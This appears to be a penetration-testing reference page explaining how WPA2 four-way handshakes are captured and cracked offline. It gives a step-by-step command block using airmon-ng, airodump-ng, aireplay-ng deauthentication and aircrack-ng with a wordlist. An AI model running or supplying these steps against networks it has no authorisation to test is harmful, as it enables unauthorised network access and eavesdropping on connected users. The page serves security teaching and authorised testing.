# WPA2 handshake capture

### Capture WPA2 handshake

When a client connects to a WiFi network, a 4-way handshake takes place, exchanging (encrypted) proof that both parties know the password. With a network card in monitor mode you can passively capture this handshake, or speed it up by deauthenticating a client (forcing it to reconnect) so the handshake occurs again. Once captured, you can attack it offline with a wordlist or brute-force (e.g. hashcat/aircrack-ng) to recover the WiFi password, without any further interaction with the network. The problem is that the password can be fully cracked without ever having been logged in, and the attack leaves almost no traces. As a result, an attacker can gain access to the internal network and therefore to all traffic and connected devices. This is possible because the handshake can be eavesdropped and its strength depends entirely on the password - a weak or common password can be cracked within seconds to hours.

<div align="center"><figure><img src="../.gitbook/assets/afbeelding (6).png" alt=""><figcaption></figcaption></figure></div>

### Exploitation

```bash
# 1. kill processes that could interfere with the wireless card
airmon-ng check kill
 
# 2. put your wireless interface into monitor mode (often wlan0)
airmon-ng start {{NIC}}
 
# 3. capture packets and write them to a file - note the 'BSSID' and 'CHANNEL' of the target access point
airodump-ng --band abg -w capture_file {{NIC}}mon
 
# 4A. monitor a specific BSSID with a specific channel
sudo airodump-ng wlan0mon --bssid '{{BSSID}}' -w CAPTURED -c {{CHANNEL}}
 
# 4B. while running airodump-ng (4A), open a new terminal and deauthenticate a connected client to force a reauthentication
# add -c 'STATIONMAC' as additional option to deauth a specific client
sudo aireplay-ng -0 5 -a '{{BSSID}}' {{NIC}}mon
 
# 5. once a handshake is captured - you will see something like underneath in the top right corner: 
# 'WPA handshake: EE:55:B8:09:D4:A0' OR 'PMKID FOUND: EE:55:B8:09:D4:A0'
 
# 6. Try cracking the handshake with aircrack-ng and a wordlist (handshake is saved in the .cap file)
aircrack-ng -w /usr/share/wordlists/rockyou.txt CAPTURED-01.cap
```
